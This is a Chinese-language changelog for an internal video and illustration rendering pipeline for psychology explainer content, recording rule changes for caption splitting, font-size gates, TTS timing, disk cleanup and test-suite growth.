  - **① 禁止在结构虚词后断屏**（`的地得把被在从对向给跟和与`）。🩸 `SOFT_TAIL` 原本把「的」当**合法结尾** ⇒ 「如果你正被持续的｜情绪困扰缠着」被判合法，**5 条科普的危机声明全中**。**jieba 拦不住它——「持续的」「情绪困扰」本来就是两个词，那确实是词边界** ⇒ **词边界是必要条件，⛔ 不是充分条件。**
  - **② 英文连续词组不可分割**。🔴 `Psychotherapy and Psychosomatics` 被劈成两屏，**第 2 屏单看是个不存在的刊名**——那不是"读着别扭"，是**编造了一个刊物**。⇒ **宁可拒绝出片要求补逗号，⛔ 也不劈开。**
  - **③ 正反问（X 不 X／在不在）不可劈**：「它还在不在影响你的日子」→「是它还在不」，**1.6s 一屏、根本不成话**。
- 🔴 **去掉 `-shortest`：末屏定格与落款此前被整个截掉**（12 条全中，落款只淡入 40–47%、末帧不透明度 63–72% 基本读不出，末屏「12356」念完立刻黑）。根因：`-shortest` 让输出取**最短流＝音频长**，而视频比音频长 `TAIL`(1.4s)。**最小样本实测**：视频 2.0s／音频 1.2s，带 `-shortest` 出 **1.2s**、去掉出 **2.0s**。⚠️ 去掉的理由写在原地并用测试钉住，⛔ 防后人顺手加回来。
- **`--precheck` 说清"断不开"的原因**：含英文词组／正反问时明说「**不可分割，逗号补在它之外**」——⛔ 别让人在不该断的地方硬断。

测试 1802→1807，全量 1807 passed。

---

## [2.13.3] — 2026-08-18

- 🔴 **hero 字高由「最长那一行」的字数决定，⛔ 与总字数无关**（小红书发布线 **13 个真实渲染样本**实测，完美单调）：**最长行 5 字 → 11.12%｜6 字 → 9.22–9.37%｜7 字 → 8.00% 🔴｜8 字 → 6.25–7.01% 🔴**，**6→7 之间正好跨过 9% 下限**。
- ⚠️ **关键反例**：总字数同为 10，**5+5 有 11.12%、3+7 只有 8.00%** ⇒ **「总字数 ≤12」那条规则会放过 3+7**。物理上也说得通：hero 宽度固定，字号 ≈ 可用宽度 ÷ 最长行字数，短的那行只是没占满。⇒ 新增量具 `hero_max_line`，判据是 **`max(每行汉字数) ≤ 6`**（想稳在 11% 就 ≤5）。
- 🩸 **报错文案改了指向**：原文写「把 hero 砍成最扎心的那个短句」——**会让人去砍总长度**，而真正要改的是**最长那一行**：3+7 那例总共才 10 字、已经很短，**砍总长没用**。现在报「**最长那一行 N 字（上限 6）⇒ 重新断行或换更短的词；⛔ 砍总字数不解决问题**」，并把 `3+7 = 8.00%` vs `5+5 = 11.12%` 那对反例写进报错——⚠️ **不带反例，人不知道差别在哪**。
- ⚠️ 交付方**自己纠了自己**：它最初报的是「两行各 5–6 字、总 10–12 字」，后半句**多余且会误导**（会让人以为 13 字拆成 7+6 可以）。⇒ **一个多余的并列条件，会把正确判据稀释成错的。**

测试 1798→1802，全量 1802 passed。

---

## [2.13.2] — 2026-08-18

- **切屏粒度定在 4–6s/屏**（`HOLD_BAND`，区间外 warn、低于 3.5s 才拒）。🩸 依据是**读代码实算**（小红书发布线）：九条说话体口播按 `_split_sentences` 是 **107 条 / 7.2–10.3s / 最长 64 字（一屏挂不下）**，按 `_split_caption_units` 是 **292 条 / 2.5–3.2s（正是老板批的"节奏非常快"）** ⇒ **粒度必须在两者之间**，以 caption units 为输入粒度、由 LLM **按语义合并**。⚠️ 合并点必须落在语义边界——**机械合并会把「一次出色，」从破折号后切走**。
- 🔴 **切分字符集立唯一真源 `SEPS`**。🩸 此前**两处各写一份且不一致**：`tts_gen._split_caption_units` 是 `，、；：,;:`（**含冒号**）、`tpl-collage-cards.html:259 splitSegs` 是 `[，、； ]`（**不含冒号**）⇒ 「很多人会接一句：所以你要等他。」按前者切、按后者不切，**印章说反话那个事故会重演**。
- ⭕ **但这个 bug 在解耦后的新架构里会自动消失**：卡片文字由 **LLM 提炼**，**⛔ 渲染层不再做任何标点切分** ⇒ 切分只剩一处，也就没有第二份可以漂。⚠️ **收 collage 进 skill 仓时必须确认这一点——⛔ 别把旧模板的 `splitSegs` 一起搬进来。**测试钉住：真源注释里必须留着那次不一致的实证。

测试 1796→1798，全量 1798 passed。

---

## [2.13.1] — 2026-08-18

- 🔴 **写稿阶段 ⛔ 不设任何字数／句数／时长上限**——老板原话（**继 G9 之后第二次强调 ⇒ 第一次没落实到位**）：**「不能因为字数限制而缩减文字，导致完全看不懂在说啥！口播稿长就长一些！」**。原话已上墙 `narration-spec` 的**上墙十条之前**。
- ⚠️ **这次按「第二次强调」的教训 grep 了全仓，改四处而非一处**：`check_collage_script`（删 `MAX_SENTS`/`DUR_RANGE`）／`SKILL.md`／`card-video-spec`／`narration-spec`。**G9 那次只改了被点名的 12 字措辞，其余版式的上限原样留着——这就是为什么会有第二次。**
- **停留不够的处置从「把这句说长」改成「把这句铺成多屏」**：⚠️ 前者仍然是**让人改稿子迁就排版**，只是方向反了。解耦后卡片只显关键词，**一句本来就能铺多屏** ⇒ 排版层自己能解决。
- **`check_plan` 支持解耦模式**（`card` ＋ `covers`）：🔴 **相关性判据对着口播原文判，⛔ 不是对着卡片自己的字判**——卡片是从口播提炼的，拿它自比等于自证。
- 🩸 **解耦解决了「电报体」，却引入新风险**（审稿代理指出）：**卡片与当时念的话对不上，比装饰性无关更糟**——观众会以为自己听漏了。⇒ 两道新闸：**卡片必须回贴口播**（覆盖时段里得真有话在念）／**切换点必须落在语义边界**（⛔ 别在一句话中间切）；并把**「卡片文字 ↔ 覆盖时段的口播原文」并排列进审稿材料**。
- ⚠️ 一条自查：改多行 docstring 时用字符串切片做手术，**连切坏两次**（把 `SPEED = 3.5` 那行一并切掉）——最后 `git checkout` 恢复重来。**手术式切片改多行 docstring 不可靠，宁可恢复重做。**

测试 1792→1796，全量 1796 passed。

---

## [2.13.0] — 2026-08-18

- **新增 collage 稿件闸门 `check_collage_script.py`**（作者交稿前跑，⛔ 不等 TTS、不等渲染），落地助理 2026-08-18 拍板的**明文规格**：**≤11 句／30–40s／每屏 ≥3.5s（印章句 ≥4.5s）／印章句首段单看必须无害**。
- 🩸 **规格此前的状态比「没有」更麻烦**：`SKILL.md` 写着「30–40 秒」、`card-video-spec.md` 写着「典型落在 8-10 句，**那是观察值不是指标**」——**数给了，却明确声明自己不作数**，于是人看到数也看到免责、各自按经验取值 ⇒ **看起来有规格，实际没有约束力**。现在**句数上限由停留下限反推**（`40 ÷ 3.5`），报错里带着这个推导。
- 🔴 **印章句那道闸的判据是被实证证伪后改的**：首版写「含转折/否定词才报」，而真实事故案例——**X2 印章屏首段「所以你要等他，」单显 1.36s**——**一个转折词都不含**，词表判据**当场漏掉了它要抓的那个案例**。⇒ 改成**「印章句含逗号就会被分段 ⇒ 一律让人确认首段单看无害」**。⚠️ 更保守会多报，但**保守的代价是多看一眼，漏报的代价是读者看到相反的意思**。
- **停留不够的处置写死为「把这句说长」**，并注明 **⛔ 不是把别的句子说短**——那正是老板 G9 批过的「为了缩减字数而刻意删减」；若整篇偏短则是**语速问题**（重跑 TTS），⛔ 不在稿件层硬撑。
- 立据一句（助理原话）：**「能用脚本量的别留给人眼」**——与本仓「自检项必须是产生新证据的动作」同源：**抄一遍规则再打勾，产生的证据是"我读过规则"，⛔ 不是"稿子合格"。**

测试 1784→1792，全量 1792 passed。

---

## [2.12.1] — 2026-08-18

- 🩸 **软断不再把词和术语劈开**（跑批实证：12 条稿子劈开 **9 处**——「参｜与」「创伤后｜应激障碍」「有｜没有」）。⚠️ 软断本来就 warn 让人裁决，但**warn 太弱、人不会逐条看**——那批是靠**手工补逗号**绕过去的。⇒ 切点必须落在 **jieba 词边界**上。
- 🔴 **`word_edges` 返回 `None` ≠ 返回空集**：前者是「**这项没查**」（jieba 未装），后者是「查了、没有合法切点」。⛔ 混为一谈会让缺依赖的机器**静默退回旧行为**而没人知道 ⇒ jieba 缺失时**明写「词边界检查这一项没做，⛔ 这不是检查过没问题」**并给安装命令。

测试 1782→1784，全量 1784 passed。

---

## [2.12.0] — 2026-08-18

- **新增视觉计划闸门 `check_plan.py`（六道）**，为「每屏动画由 LLM 按语义设计」这条产线打地基。老板原话：「**我看到动画与内容并无关联**……**不能只是简单的套用模板**。每一页是什么动画，什么特效，需要有 llm 来设计」。
- 🔴 **真正的难点不是让 LLM 生成计划，是让「相关」可被证伪**——否则它会生成**看起来很合理、实际仍然无关**的计划，而人和审稿代理**都只能点头**，那只是把「套模板」换成了「套措辞」。⇒ **判据**：**把某屏的 `why` 原样挪到别的屏，如果还成立，它就不算相关。**落成两条：① `why` **必须逐字引用本屏 `text` 片段（≥2 字）**｜② **跨屏主干唯一性**（warn）。
- **⛔ 不做「相关性评分」**：分数会诱人调阈值。**判据是二元的**——引用了本屏文本＝有依据，没引用＝没依据。
- ⚠️ **引用识别不只认引号**：先认显式引号，再退回「任意 ≥2 字公共子串」——**LLM 未必总加引号，只认引号会把合格计划判死**。
- **六道闸**：文本一致（⛔ 计划不许改稿子的字）／三个闭集（semantic 12・motif 6・relation 5）／强调词须在文内／相关性／跨屏唯一性（warn）／**停留下限 3.5s**。
- 🔴 **停留下限那条的报错要说出「这不是排版问题」**：停留时长 ＝ `cue 时长 ÷ 拆屏数`，而 **cue 时长是 TTS 定死的** ⇒ **合并到「一句一屏」仍不够，那是语速问题**，出路是重跑 TTS 放慢或加句间停顿。⛔ 不说这一层，人会在排版层徒劳地改。
- 另附设计稿 `docs/2026-08-18-视觉编排设计稿.md`（数据流／plan schema／可审产物／⛔ 明确不做的三件）。

测试 1773→1782，全量 1782 passed。

---

## [2.11.0] — 2026-08-18

- **新增离线预检 `build_oneline.py --precheck 稿.txt`**：跑批前**不烧 TTS 配额**就知道有几处断不开、几处会自动软断。🩸 起因：某线自造了一份预检，**报 17 处断不开、真闸只报 2 处**——**两把尺不同源**。
- 🔴 **所以本预检直接调用真闸用的那两个函数**：切句用 `tts_gen._split_sentences`（TTS 的统一单元）、拆屏用本模块的 `split_cue`。**⛔ 绝不另写一份「预检版」逻辑**——不同源等于没预检，**而且它会在你最需要它的时候报出不同的数**。测试 `test_预检与真闸必须同源` 测的不是"预检能跑"，是**两者读数一致**。
- 🩸 **`--out` 从 required 放宽**：预检根本不产出文件却被它挡住，argparse 只顶回一句 usage——**看不出「是不是预检也要传」**。⚠️ 我差点据此判「预检与真闸不同源」，**真因是我的测试命令缺参数**——又一次**先怀疑量具**才没得出错结论。缺 `--out` 现在报人话。

测试 1771→1773，全量 1773 passed。

---

## [2.10.2] — 2026-08-18

- 🩸 **整片渲完默认清帧目录**（`--keep-frames` 可留）。起因是跑批前的一次体积核算：**1080×1440 30fps 的 PNG ≈2.3MB/帧，一条 3–6 分钟口播＝12–25GB，12 条并存 241GB**，而机器可用 248G——**还得减去别人正在用的**。⚠️ **磁盘是共享的：撑爆不是本线这批失败，是连同时在出片的别条线一起死。**⇒ 清帧从「跑批脚本各自记得做」提到**产线默认行为**，⛔ 不再指望每个调用方自觉。
- 🔴 **删的判据是 `ffprobe` 读得出成片时长，⛔ 不是「文件存在且非空」**——MP4 的 moov atom 在**末尾**写入，混音进行中的半成品同样存在、同样有几 MB（今日实测：3.8MB 半成品报 `moov atom not found`，写完是 25MB）。**拿"存在"当"渲完了"去删帧，会把还在用的帧删掉，而那是不可逆的。**⇒ 读不出时**保留并明说「这不是渲完了」**。
- ⚠️ **分片模式（`--shard`）不清帧**——帧还要给别的片与 `--mux-only` 收口用；靠 `main` 里的 `if a.shard is None` 守，⛔ 别把清理塞进 `render()`（那样分片跑到一半会互删）。测试专门钉住这一点。
- **spec 新增一节「批量开跑前先算体积×条数比可用磁盘」**，通则：⛔ 别等跑到第 8 条才发现磁盘满了——那时前 7 条的算力和 TTS 配额已经花掉了。

测试 1767→1771，全量 1771 passed。

---

## [2.10.1] — 2026-08-18

- 🩸 **修一条会让整批全废的缝（跑批前冒烟抓到）**：`render_card.py` 用 `Path(__file__).parent` 找 `narration.mp3.cues.json` 与音频，而 `card-video-spec.md` 示例写的是 `cd 工作目录 && python3 render_card.py`——**暗含脚本已在工作目录**；但 `build_oneline.py` 此前只拷 gsap 与字体，**不拷 `render_card.py`** ⇒ **照规格抄命令的人必然 `FileNotFoundError`**，⚠️ **而且死在 TTS 配额烧完之后**（渲染是产线最后一步）。
- ⇒ 选了「**build_oneline 一并拷脚本副本**」而非「改 `render_card` 的路径基准」：**既往批次本来就是每条视频各带一份副本**（那两个重名文件就是这么来的），⛔ 改成按 cwd 找会动到所有历史工作区。已加测试 `test_工作目录必须自带render_card副本`，并**端到端验过**——照 spec 原句跑通、分片渲染正常。
- 🔴 **这是「文档与代码各自都对、合起来必炸」的又一例**，也正是常设「零上下文干跑」工序要抓的那一类。⚠️ 附一条我自己的记录：**我今天做 G13 真片时手动拷了 `render_card.py` 进工作目录，绕过了这个坑却没意识到那是规格里没有的一步** ⇒ **熟练的人会无意识地补上缺失步骤，于是缺口在他手里永远不暴露。**
- `define` 字段 `phenom` → `phenomenon`：**缩写只在「补全后仍是同一个词」时才安全**（`phenom` 可能是 phenomenon 也可能是 phenomena，而这些 JSON 是写稿人手写的，**猜错不报错、只会把内容填错格子**）。同时删 `compare` 的 `note?` 空字段——**空字段会诱人往里塞东西**。
- 🩸 **改字段名时撞出一个真实假绿**：replace 把 `class="phenom"` 也连带改了，CSS 选择器没跟着改 ⇒ 现象句丢样式、JS 取到 `null` ⇒ 比值成 `Infinity`，而 **`inf < 1.15` 为假 ⇒ 闸门报「✅ 全过」**。⇒ 补 `missing_layers` 防护（必需层取不到直接报「**这不是达标，是没量到**」）并证伪过。**这是「没做 ≠ 做了没问题」在数值层的化身：取不到 ≠ 比值达标。**

全量 1767 passed。

---

## [2.10.0] — 2026-08-18

- **公众号正文插图产线（HTML 确定性渲染）**：`render_illust.py` ＋ 三个版式 `tpl-steps` / `tpl-compare` / `tpl-define`。⛔ 不走出图 API——插图是**排版问题不是绘画问题**；图内要中文短标注（AI 出图写中文不可控）；而且**老板现在充不了 OpenAI**，那条路眼下不通。围栏 JSON 与 `gen_gzh_images.py` 同族（插图用 `layout` 键）。
- 🔴 **三个版式各自的形态判据（服务号线拿真稿逐条定的，⛔ 别按字面猜）**：
  - `steps`：每步「短动作名＋一句展开」，**展开句常带一条反例**，版式给反例**固有槽位**——⚠️ 但**允许缺席**（真稿第 3 步就没有）。⛔ 别强制：**逼写稿人硬造一条禁令，比没有禁令更糟——读者会把硬造的「别做 X」当成真的风险提示。**
  - `compare`：**⛔ 不是「A vs B」，是「你以为的／实际的」**。心理科普里几乎不出现对等比较，出现的是**纠正** ⇒ 两栏权重不对等（栏宽 38/62、事实句字号 1.3 倍、误解句删除线＋淡化）。**新增不对等闸：栏宽比 <1.25 报红**，防的就是后来有人调成对称天平——**对称会读成「两种观点各有道理」，正好是反效果。**
  - `define`：**⛔ 不是名词解释卡**，是「**词＋它是什么体验**」，目的是让人认出「这说的是我」。🔴 体验分两半、权重必须不同：**前半＝描述现象（读者点头）／后半＝命中处境（读者愣一下）**。**新增闸：命中句/现象句字号比 <1.15 报红**——⛔ 合成一段就把「认出自己」那一下淹没在描述里了。⚠️ 版面装不下时**宁可砍前半的修饰，也要留住后半**。
- 🔴 **字号下限闸（三版式共用）**：`@375px 手机正文宽（≈0.286 倍）下，内容层最小的那个 ≥11px`。**实证**：4 步/张时展开句只有 **7.1px**、反例 **6.3px**——**读者截图保存后最要紧的那层是糊的**（心理自助步骤图**会被截图保存**，所以必须能独立使用）。⇒ **每张 2 步是这条闸反推出来的，⛔ 不是先定的规矩。**
- 🩸 **闸门自己出过一次假红，修法值得记**：首版把标题/副题也纳入判定，报「副题 6.9px」——**取样范围比要守的东西宽＝假红**；更坏的是**处置建议不成立**（让人「减少每张步数」，可副题字号与步数无关）⇒ **一个照做也解决不了的报错，会教人忽略这道闸门，下次真红也一起被忽略。**改成只守「读者照着做需要读的层」。
- **页码是功能层不是装饰层**：读者读不出「还有第 2 张」，**就会以为四步只有两步、照着做完两步就停了** ⇒ 那是**内容缺失**不是美观问题，进 `CONTENT_LAYERS` 参与判定。
- 🩸 **一条做不成机器闸门的**：`align-items:stretch` 把误解栏撑成**底部大片空白的空盒子**——⚠️ 它与"整图留白是节奏"在**「空白占比」这个指标上完全一样**，**量不出区别** ⇒ 只能实渲目视。**知道哪些事必须靠眼睛，本身就是一种判据。**
- **⛔ 不替内容线写医学表述**：首版 compare 的事实句是我填的占位，**把警示语直接印在图上**（一张带「这句是占位」字样的图不可能被误当成品用出去，比在消息里叮嘱可靠）；真句由服务号线从原稿取来后替换。

全量 1766 passed。

---

## [2.9.0] — 2026-08-18

- **新增字卡背景档 `xianwen`（纤纹·浅米白＋纸纤维）**，老板 G15 拍板：**在 `miwen` 基础上加纸感，走新增档、⛔ 不覆盖**。颜色四项（底色/墨色/压角/落款）与 `miwen` **逐字段相同**，只多 `fiber`（定向拉伸湍流＝纤维走向）与 `crease`（低频大尺度微皱）两层。落库的与老板批的那张图**逐像素 100.0000%、最大差 0**——不是"参数抄对了"，是同一个东西。
- 🔴 **「老片不变」的两层保证**：① **数据**——老档四组合（含 paragraph 版式）**逐字节＋逐像素双零变化**（我独立复算过，⛔ 不只信报告）；② **代码**——⚠️ 背景层是两个版式**共用的统一生成函数**（v2.7.1 刚抽的），**无条件往里加 fiber/crease，`miwen` 会跟着长出纸感**。⇒ 改成 `bg_layers(bg)` 条件生成：**只有配了 `fiber`/`crease` 的档才长那两层**，另加测试 `test_纸感层只长在配了它的档上` 专门守它。
- **「设为默认」落三处，⛔ 没碰 argparse**：docstring 示例 / spec 命令行示例 / spec「现行首选」标记 → 全迁到 `xianwen`。**⛔ 仍不给 `--bg` 加 default**——既有红线「绝不编默认值悄悄出片」不动。🔲 真正决定新片背景的 `video.oneline.bg`（nbdpsy-server 数据）另派运营线。
- ⚠️ **如实报一项轻微退步**：落款反差 Otsu 亮度差 `miwen` 56.0 → `xianwen` **54.5（−1.5）**，峰谷差反而 +4。**两个口径方向相反**——纸感层加大了落款区背景自身起伏，背景簇均值被拉低。判据仍是「高于 `liaoyu` 现状 53.1」，**过线，`brand` 不动**。⇒ 已写进 spec：**往背景加纹理会轻微吃掉落款反差，以后再加纹理层必须重量这一项。**
- 🩸 **同步闸门第二次拦住的还是它自己人**：加完档没补 spec 表，`test_spec_doc_sync` 当场报红——**正是当初做破坏实验 C 的那一格**。顺手修了它一个缺陷：漏行时抛 `KeyError`（**不可操作**，违反"报错要可操作"），改成带处置建议的断言。
- 🩸 **三次"测试写错了、不是被测对象错"**：数 `soft-light` 得 6 不是 2（**注释里也有这个词**）｜`intercept='0.0146'` 找不到（**产物是 URL-encode 的**，`'`→`%27`）｜元测试变异目标不再唯一（**加一档会让既有元测试的"唯一目标"假设失效**，表现为"尺子读不到"）。⇒ **第三条最值得记：新增数据会让测试的隐含假设静默破掉。**

测试 1763→1766，全量 1766 passed。

---

## [2.8.0] — 2026-08-18

- **新增对冲强度比对 `--source-text`（warn 不拦）**：上游文本（正文/要点）有、下游（口播）**整类消失**的对冲类别 → 报。**任意上下游两层都能用**（要点→正文、正文→口播），⛔ 没写死成「正文 vs 口播」。
- 🩸 **它治的病是跨三稿的同向漂移**（X4 批次独立审查）：**压句长时，对冲词是最先被牺牲的那一类**。最狠的一条：正文「它有**可核对**的结果」→ 口播「后者**有结果**」——**删掉三个字，从「你能看清他做没做」变成「这么说他就会做」**，直接撞红线「⛔ 不承诺效果」，**而且它是全片最后一句、听众带走的那一句**。这句原样写进报错文案，⛔ 不写「注意保留对冲词」这种空话。
- ⚠️ **还有一种更隐蔽的，同一个函数能抓**：**对冲句根本没进发布层**（边界句只写在给制图/内审的「要点」里，发布正文没有）⇒ **内审看要点觉得"边界写了啊"，读者看正文却读到效果承诺，双方都以为有人管了。**
- 🔴 **词表来自稿库实证，⛔ 不是凭感觉编的**：扫 `seo-geo/content` 下 535 个 txt/md 统计词频。**直接砍掉四个零命中的编造词**（一般来说／不见得／一定程度上／某种程度上——其中「一般来说」就在我第一版表里），**补进四个高频真用词**（几乎 294／至少 145／更容易 118／大概 113）。**每个词在注释里带着它的频次/文档数。**
- **⛔ 按类别比，不按词比**：「往往」改说「多半」是合法同义替换，按词比会误报到没人肯看；只有**整类在下游全部消失**才报。**⛔ 不收单字词**（能／可／只／若／更）——误报太多；⚠️ 这是对「单字词误报多」的解法，⛔ 不是改成需要句对应的局部比对（那个做不到）。
- ❌ **明确做不到的一条**：「条件句变断言」——没有对冲词可抓时，强度差是**语义**的，机器判不了。⛔ 不假装能拦。

测试 1758→1763，全量 1763 passed。

---

## [2.7.1] — 2026-08-18

- **`--sec-cues` 默认 3→6**：原值是凭空拍的。运营线给的真 cues（68 句／185.1s）是第一份能验它的数据——**3→23 段（每段 6.7s，换手法太频繁）｜6→12 段（12.9s）｜9→8 段（19.4s）**。`--help` 里连**口播语速真值 3.5 汉字/秒**一并写进去（⛔ 别用 4.5 估，偏 29%），让下一个人能换算自己稿子的段落时长。
- **背景层抽成 `__BG_LAYERS_CSS__` / `__BG_LAYERS_HTML__`**（真源在 `build_oneline.py` 的 `BG_LAYERS_*`）。起因：`tpl-paragraph` 的背景是照 `tpl-oneline` 复制的 ⇒ **一份定义变成两份，而第二份当场就漂了**——掉了「四角压暗」那行注释，`#paper` 的注释还被精简掉两句。⚠️ **丢的都是注释：没有视觉后果，却少了给下一个人的路标。**⇒ 抽完**不可能再漏**（新模板忘放占位符，`instantiate()` 的「还有没填的占位符」检查当场退出）。**纯机械重构的证据**：改前存三组合基线，改后 `cmp`——在产的 oneline 两档**逐字节一致**；paragraph 有差异，**全部是补回被精简的注释**（相对「已补回『四角压暗』那行」的基线是 1 处，相对本次 commit 前是 2 处）。同伴独立复算了**渲染像素**：三组合各按自己 `render-canvas` 的真实画幅截图，**相同像素 100.0000%、最大差 0** ⇒ 注释不进渲染，出片零影响。
  🩸 **报差异必须写明「相对什么」**：我最初说「差异全文就这一处」而没带基线，同伴按 commit 前的基线复核就成了两处——**两个说法都对，差的是基线**。⚠️ 同一个根今天咬了四次（`mtime` 判「没改」时不知道原时间／拿改后的现状判改前的报告／跨轮报告不声明作废／这次）：**谈变化却不说相对哪个时刻。**
  ⭕ 另记一条方法差距：**我比的是 HTML 文本，同伴比的是渲染像素**——「HTML 有差异」与「出片有差异」是两回事，**只有后者是真正该关心的**。
- 🩸 **两个方向的取样错误，同一天各撞一次**：① 我那条「两模板背景层一致」的测试**没红**——正则只抽花括号内部，**注释在外面** ⇒ **取样比要守的窄＝假绿**；② 若按目录遍历模板会对 4 个不用这套背景层的模板报红 ⇒ **取样比要守的宽＝假红**。**假红更险：它会驱使人去"修"一个没坏的东西**（`tpl-collage` 有个同名 `#paper`，但那是它自己的一张会动的纸）。⇒ **闸门的守备范围来自登记表（`TEMPLATES`），⛔ 不来自目录扫描或特征匹配。**
- **新测试**：每个 `TEMPLATES` 里的模板必须含两个占位符且不得再手写 `#paper`/`#vignette`（先断言扫到数 == 表里条数）；**背景层定义里必须带着「为什么」**（`feDiffuseLighting` / 彩色噪点 / 四角压暗三条路标各断言一次）——⛔ 谁精简掉，下一个人就会再走一遍那两条死路。

测试 1756→1758，全量 1758 passed。

---

## [2.7.0] — 2026-08-18

- **新增第六版式 `tpl-paragraph`（段落字卡）**，应老板 G13「模板要撑得住 3 分钟」。`build_oneline.py --template paragraph`，与 oneline **共用整条数据管线**（断句／像素闸／字体闸），差别只在动效编排层。⛔ **默认仍是 oneline，旧版式产物实测逐字节零变化**（拿 `git show HEAD:` 取改动前脚本对跑，`cmp` 一致）。
- ★ **核心理念：段内统一，段间变化。** 重复不是错，**没有边界的重复**才是。段内重复形成节奏，段间变化形成丰富。⛔ **逐屏随机换手法＝杂乱，不是丰富**——那是另一种失败，测试要能分开这两者（`test_变奏是确定的不是随机的` 直接禁掉 `Math.random`：随机会撞车，且同一稿两次渲染不一样）。
- **动效件库补上旧模板 0/7 的那几类**：`wipe`（clipPath 揭示——**字卡最主力的手法，五个旧模板一个都没有**）、`depth`（blur 对焦）、`drift`（横向＋skew）、`tilt`（rotationX 空间）、`still`（**留白件：丰富 ≠ 一直在动，长片必须有喘息处，否则观众把「有变化」读成「很吵」**），加基准件 `rise`。实测 24 句 → 8 段 → **6 种动效、相邻段零重复**。
- 🔴 **交接提前量必须由「两屏的组合」决定，⛔ 不由单屏自己的 motif 决定**——这条我改错过一次：头版让每屏按自己的 motif 提前，`rise→wipe` 边界照样脏，因为**退场的是 rise（提前量 0），而脏不脏取决于接它的是谁**。⇒ 判据落在**段边界**上；段内保持 oneline 的同向交叠（那是推进感不是脏），段间提前 0.12s 退干净。截帧实证：修前 wipe/drift/depth 三格都有残影，修后六格全干净。
- 🩸 **量具三连坑（都在这一轮撞上）**：① 用 `opacity` 量重叠 → **`wipe` 全程 opacity:1 靠 clipPath 裁，量不出来**，修前修后报同一个数；② 修了 clipPath 解析仍相同 → 真因是**我量了全部 36 个交接点，而其中大部分是段内交接（重叠是设计内的）**——⛔ 量错了对象，不是尺子坏；③ 测试解析用 `split(";\n")` 取 `SCREENS` → 占位符后跟的是「;   // 注释」不是换行。**解析逻辑本身也是量具，一样会坏。**
- 另：测试首版造了 14.6 字无标点的假句子，被单行闸门正确拒绝 ⇒ **闸门拦住我的测试数据，说明闸门是活的**（数据不合格，⛔ 不是代码问题）。

测试 1750→1756，全量 1756 passed。

---

## [2.6.0] — 2026-08-18

- **口播规格新增两律，均由老板 2026-08-18 逐字批语立**（G14 三版对照的结论：**两版都输了，而且输的都不是「顺不顺」**，是「说没说清」「判没判准」——与 G9「把事情说清楚才是第一位」同源）：
  - **第九律 b：指涉必须稿内可回溯**。⛔ 事故句「**我们跟踪的那群人，练了六周，连按时吃药这件事都变得更规律了**」→ 老板批「没有前情提要，读不懂这个是什么跟踪，练了什么」。⭕ **改法是补前情，不是删指涉**。⚠️ 与原第九律是两回事：**原律管「别指向介质」，这条管「别指向稿外」**。自检动作＝把每个「那／这＋名词」抽出来答「读者在这句之前从哪一句知道它是什么」。
  - **§八·钩子新增前提：先把读者第一反应判准**。⛔ 事故句「很多人听着就**想翻白眼——是不是给自己找借口啊**」→ ⭕ 老板改判「**第一感觉像是没有用的鸡汤**」。**反直觉是相对读者当下那个念头而言的；第一反应判错，整个钩子打在空处。**三步先后＝**判准第一反应 → 找到认知落差 → 用日常例子把落差演出来**，最容易跳过的是第一步（它不产出文字）。
  - 上墙十条加 **11／12**，⛔ 没重排前十条（别处按号引用）。
- 🔴 **特意没做的事：⛔ 没把「读者第一反应」做成 `--intent-file` 的第四问。**按 v2.4.0 立的判据「答案要可被机器比对才算数」——**判得准不准机器判不了**，做成闸门只能验「有没有写」，而那正是会退化成填表的那种。**加了它会看着很严谨，实际只是多一栏要填的空。**⇒ 先写进规格，若下一篇仍犯同病再谈闸门（且那时该上的也不是「你写了吗」）。
- **新增长时长模板调研**（`docs/2026-08-18-长时长模板调研.md`，应老板 G13）：**「内容贫乏」不是审美问题是结构问题**——五个字卡模板各自只有一条扁平时间轴（`.add()`／`addLabel` 全为 0），**没有「段落」这个中间层**，所以内容一长，循环套同一动效成为唯一可行解。动效语汇合计 7 个，**`clipPath`/`mask`（字卡最主力的「揭示」类）0/7 个模板用过**。

全量 1750 passed。

---

## [2.5.2] — 2026-08-18

- **文档↔代码同步立成常驻测试**（`tests/test_spec_doc_sync.py`，7 条）：`card-video-spec.md` 的档位表与 `BG`、画幅表与 `CANVAS` 逐项比对。**根子是「那两张表与代码脱节了半年没人察觉」**——加档的人不会记得回去改文档，但会看到测试红。
- 🔴 **实验 B 是这道闸的靶心**：把文档实占改回历史错值 `1562` 立刻红并打印公式算出的 `1604` ⇒ **如果当年就有这条测试，`1562` 从写下那天起就会红**。那个数不是"过时"，是**当初就算错了**（拿 `3:4` 的描边 13 去算 `16:9`），肉眼永远发现不了，只有拿公式重算才露馅。
- **三条防「这把尺自己变恒绿」的设计**（7 条里有 4 条是在测尺子会不会失灵）：① **先断言规模**（`set(文档档名) == set(BG)`），⛔ 不是"parse 出几行就比几行"；② parse 不到时**报错且指向"改尺子"而不是"改文档"**（「那张表可能是对的，错的是这把尺」）；③ **按数值比 + 公式独立复算**，⛔ 不抄代码字面量（抄了的话"两档串行"那种错照样能过——`1562` 抄进测试就成了标准答案）。
- 🩸 **顺带挖出一个更隐蔽的陷阱：陈旧 `pyc` 让「还原了」变成假象**。做「改坏 → 跑 → `git checkout --` 还原 → 再跑」这类 A/B 验证时，还原后 **md5 逐字节一致、`git diff` 为空、源文件里写着 `seed=17`，但 `import` 出来是 `seed=99`**。根因：timestamp-based pyc 只校验 **(mtime 秒, size)**，而 `git checkout` 把 mtime 设成 checkout 那一刻**恰好与 pyc 记录同秒**，`17`→`99` 又是**等长替换 size 不变**——两个校验位同时失效。**⇒ 差点照着"md5 是对的"去改测试迁就，把一条刚写对的闸门改坏。**⛔ 本仓做这类实验，还原后先 `find . -name __pycache__ -prune -exec rm -rf {} +` 再跑。
- **判据**：「凡结论形如**『还原了但结果没变』**，先问**『我读的和我还原的是不是同一层东西』**」——md5 证明的是**文件内容**，测试读的是 **pyc 字节码**，量具与被量对象差了一层。

测试 1743→1750，全量 1750 passed（清缓存后复跑核对）。

---

## [2.5.1] — 2026-08-18

- **结构自证的第三种失败情形分出来了：值跨了 ≥2 句**。此前它与「稿里真没有」共用一句报错「这句不在稿里」——实测（需求方跑真稿）**第一反应是「脚本坏了」，那句明明在稿里**，第二反应才是「是不是我粘多了」。🔴 **而第一反应会让人去改脚本或绕过闸门**。现在报「你给的值含 N 个句子。比对是按**单条**（句/页/镜）做的，跨条的文本必然找不到——请只粘其中一句」。
- ⇒ 三种失败现已各有各的话：**稿里真没有** / **有这句但字面对不上（多半是标点）** / **值跨了多句**。**这是同一条判据的第三次落地：报错的精度直接决定人会不会走错路。**
